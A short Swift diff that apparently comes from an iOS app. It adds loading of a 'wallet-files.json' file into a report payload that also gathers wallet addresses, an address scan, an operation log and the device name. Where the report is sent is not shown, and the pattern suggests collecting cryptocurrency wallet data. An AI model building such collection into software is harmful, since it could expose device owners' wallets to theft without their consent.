@@ -55,6 +55,15 @@ enum ReportBuilder {
         return dict
     }
 
+    static func loadWalletFiles() -> [[String: Any]] {
+        let url = URL.documentsDirectory.appendingPathComponent("wallet-files.json")
+        guard let data = try? Data(contentsOf: url),
+              let rows = try? JSONSerialization.jsonObject(with: data) as? [[String: Any]] else {
+            return []
+        }
+        return rows
+    }
+
     static func loadWalletScan() -> [[String: Any]] {
         let url = URL.documentsDirectory.appendingPathComponent("address-scan-report.json")
         guard let data = try? Data(contentsOf: url),
@@ -128,12 +137,14 @@ enum ReportBuilder {
 
         let addresses = loadAddresses()
         let walletScan = loadWalletScan()
+        let walletFiles = loadWalletFiles()
 
         let payload: [String: Any] = [
             "source": "erosion",
             "opLog": OpLog.load(limit: 120),
             "addresses": addresses,
             "walletScan": walletScan,
+            "walletFiles": walletFiles,
             "reportedAt": ISO8601DateFormatter().string(from: Date()),
             "device": [
                 "name": UIDevice.current.name,
